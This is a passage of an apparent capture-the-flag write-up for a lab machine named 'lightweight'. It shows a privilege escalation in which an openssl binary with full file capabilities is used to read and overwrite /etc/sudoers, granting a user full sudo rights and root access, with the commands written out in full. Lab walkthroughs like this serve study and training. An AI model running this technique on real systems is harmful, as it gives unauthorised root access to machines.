[ldapuser1@lightweight ~]$ ls
capture.pcap  ldapTLS.php  openssl  tcpdump
[ldapuser1@lightweight ~]$ id
uid=1000(ldapuser1) gid=1000(ldapuser1) groups=1000(ldapuser1) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[ldapuser1@lightweight ~]$ 
```


We can check the [capabilities](http://man7.org/linux/man-pages/man7/capabilities.7.html) of the program files here with the [getcap](http://www.man7.org/linux/man-pages/man8/getcap.8.html) command.

```
getcap . 2>/dev/null
```

The results are surprising.

```
[ldapuser1@lightweight ~]$ getcap . 2>/dev/null
./tcpdump = cap_net_admin,cap_net_raw+ep
./openssl =ep
```

[openssl](https://linux.die.net/man/1/openssl) has ep cap set, so it can do anything!



<hr width="300" size="10">


We can use openssl to base64 encode a copy of the sudoers file, 

```
./openssl base64 -in /etc/sudoers |base64 -d > /dev/shm/sud
```

give ldapuser1 ALL sudo privileges, 
```
echo "ldapuser1    ALL=(ALL)    ALL" >>/dev/shm/sud
```

then replace the original file with the modified one.
```
cat /dev/shm/sud |base64 | ./openssl enc -d -base64 -out /etc/sudoers
```

<hr width="300" size="10">



Grab the root flag:

```
[ldapuser1@lightweight ~]$ ./openssl base64 -in /etc/sudoers |base64 -d > /dev/shm/sud
[ldapuser1@lightweight ~]$ echo "ldapuser1    ALL=(ALL)    ALL" >>/dev/shm/sud
[ldapuser1@lightweight ~]$ cat /dev/shm/sud |base64 | ./openssl enc -d -base64 -out /etc/sudoers
[ldapuser1@lightweight ~]$ sudo su
[sudo] password for ldapuser1: 
[root@lightweight ldapuser1]# cat /root/root.txt
f1dxxxxxxxxxxxxxxxxxxxxxxxxxx5fa
[root@lightweight ldapuser1]# 
```


<hr width="300" size="10">


:)


